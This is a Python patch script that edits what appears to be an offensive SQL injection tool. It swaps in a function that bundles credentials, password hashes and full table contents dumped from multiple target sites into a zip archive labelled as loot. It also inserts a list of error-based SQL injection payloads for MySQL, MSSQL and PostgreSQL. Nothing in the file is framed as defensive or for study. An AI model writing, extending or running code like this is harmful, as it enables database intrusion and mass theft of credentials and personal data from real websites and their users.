import sys, py_compile
fn=sys.argv[1] if len(sys.argv)>1 else "new.py"
src=open(fn,"r",encoding="utf-8").read()
a=src.index("def build_zip(dumps):")
b=src.index("def count_loot(dumps):")
NEW=r'''def build_zip(dumps):
    bio=io.BytesIO()
    allcreds=set(); allhash=set()
    for d in dumps:
        for c in d.get("creds",[]): allcreds.add(c)
        for tn,td in d.get("tables",{}).items():
            for row in td["rows"]:
                allhash.update(re.findall(r"\b[0-9a-f]{32,64}\b",row))
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as z:
        if allcreds: z.writestr("dump/creds_all.txt","\n".join(sorted(allcreds))+"\n")
        if allhash: z.writestr("dump/hashes.txt","\n".join(sorted(allhash))+"\n")
        for d in dumps:
            host=urlparse(d["url"]).netloc.replace(":","_") or "site"
            base="dump/"+host+"/"
            z.writestr(base+"info.txt","URL: "+d["url"]+"\nDB: "+d.get("db","?")+"\n"+"\n".join(k+": "+v for k,v in d["info"].items())+"\n")
            z.writestr(base+"tables.txt","\n".join(d["tables"].keys())+"\n")
            if d.get("creds"): z.writestr(base+"creds.txt","\n".join(d["creds"])+"\n")
            for tn,td in d["tables"].items():
                safe=re.sub(r"[^A-Za-z0-9_\-]","_",tn)[:40]
                z.writestr(base+"table_"+safe+".txt","TABLE: "+tn+"\nCOLUMNS: "+", ".join(td["columns"])+"\n"+"\n".join(td["rows"])+"\n")
    bio.seek(0)
    return bio.getvalue()
'''
src=src[:a]+NEW+"\n"+src[b:]
e=src.index("ERR_PAY=")
e2=src.index("\n",e)
EP=r'''ERR_PAY=["'","\"","')","'-- ","\"-- ","')-- ","' AND extractvalue(1,concat(0x7e,version(),0x7e))-- ","' AND updatexml(1,concat(0x7e,version(),0x7e))-- ","' AND 1=CONVERT(int,(select @@version))-- ","' AND 1=CAST((select version()) AS INT)-- "]'''
src=src[:e]+EP+src[e2:]
open(fn,"w",encoding="utf-8").write(src)
try:
    py_compile.compile(fn,doraise=True)
    print("FIXED + SYNTAX OK:",fn)
except Exception as ex:
    print("STILL ERROR:",ex)
